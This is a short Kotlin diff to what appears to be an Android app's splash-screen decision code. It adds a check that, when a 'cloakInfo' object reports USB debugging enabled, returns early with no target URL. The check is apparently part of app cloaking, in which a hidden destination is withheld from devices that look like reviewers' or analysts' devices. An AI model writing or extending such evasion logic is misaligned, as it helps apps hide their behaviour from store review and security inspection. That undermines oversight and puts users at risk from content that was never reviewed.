@@ -66,6 +66,13 @@ constructor(
                 val decision =
                         withTimeoutOrNull(SPLASH_TIMEOUT_MS) {
                             val cloakInfo = collectCloakInfoUseCase()
+                            if (cloakInfo.isUsbDebuggingEnabled) {
+                                return@withTimeoutOrNull DecisionResult(
+                                    is_intro_completed = true,
+                                    targetUrl = null,
+                                    reason = "USB Debugging Enabled"
+                                )
+                            }
 
                             getDecisionUseCase(DecisionInput(cloakInfo))
                         }
